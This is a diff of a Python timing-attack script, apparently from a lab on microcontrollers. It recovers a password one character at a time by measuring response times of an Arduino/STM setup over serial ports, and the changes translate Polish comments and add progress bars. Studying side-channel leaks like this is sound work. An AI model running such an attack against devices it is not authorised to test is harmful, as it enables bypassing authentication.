@@ -1,6 +1,7 @@
 import serial
 import time
 import statistics
+from tqdm import tqdm
 
 def send_password_to_arduino(arduino_serial, password):
     """Send a password to the Arduino."""
@@ -21,8 +22,8 @@ def measure_execution_time(stm_serial):
             return int(response.split(":")[1].strip().split()[0])  # Extract time in ns
 
 def timing_attack(repetitions=8):
-    known_password = ""  # Odkrywane hasło
-    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"  # Możliwe znaki
+    known_password = ""  # Discovered password
+    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"  # Possible characters
 
     # Open serial connections
     with serial.Serial('COM5', 9600, timeout=1) as arduino_serial, \
@@ -31,11 +32,11 @@ def timing_attack(repetitions=8):
         arduino_serial.reset_input_buffer()
         stm_serial.reset_input_buffer()
         time.sleep(2)  # Wait for the serial connections to be established
-        for _ in range(8):  # Zakładamy długość hasła 8 znaków
+        for _ in tqdm(range(MAX_PASSWORD_LENGTH), desc="Discovering password"):
             timings = []
 
-            for char in charset:
-                test_password = known_password + char + "A" * (7 - len(known_password))  # Padding
+            for char in tqdm(charset, desc="Testing characters", leave=False):
+                test_password = known_password + char + "A" * ((MAX_PASSWORD_LENGTH-1) - len(known_password))  # Padding
                 repeated_timings = []
 
                 # Repeat measurements to calculate median
@@ -52,13 +53,14 @@ def timing_attack(repetitions=8):
             # Find the character with the longest median execution time
             best_char = max(timings, key=lambda x: x[1])[0]
             known_password += best_char
-            print(f"Odgadnięty dotychczasowy ciąg: {known_password}")
+            print(f"\nDiscovered sequence so far: {known_password}")
 
         return known_password
 
-# Uruchamiamy atak
+# Run the attack
 if __name__ == "__main__":
-    print("Rozpoczynamy atak timingowy...")
-    repetitions = 5  # Liczba powtórzeń dla obliczenia mediany
+    MAX_PASSWORD_LENGTH = 8
+    print("Starting timing attack...")
+    repetitions = 5  # Number of repetitions to calculate the median
     recovered_password = timing_attack(repetitions)
-    print(f"Odgadnięte hasło: {recovered_password}")
+    print(f"Discovered password: {recovered_password}")
